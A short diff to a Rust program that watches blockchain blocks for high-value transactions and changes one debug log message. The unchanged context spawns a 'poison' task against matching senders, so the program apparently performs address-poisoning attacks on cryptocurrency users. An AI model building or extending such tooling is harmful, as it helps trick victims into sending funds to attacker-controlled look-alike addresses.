@@ -47,7 +47,7 @@ async fn main() {
 
         for transaction in block.into_transactions_iter() {
             if transaction.value() > target_value {
-                debug!("new transaction received | hash {}", transaction.tx_hash());
+                debug!("matching transaction found | hash {}", transaction.tx_hash());
 
                 if config.target.from {
                     tokio::spawn(poison(
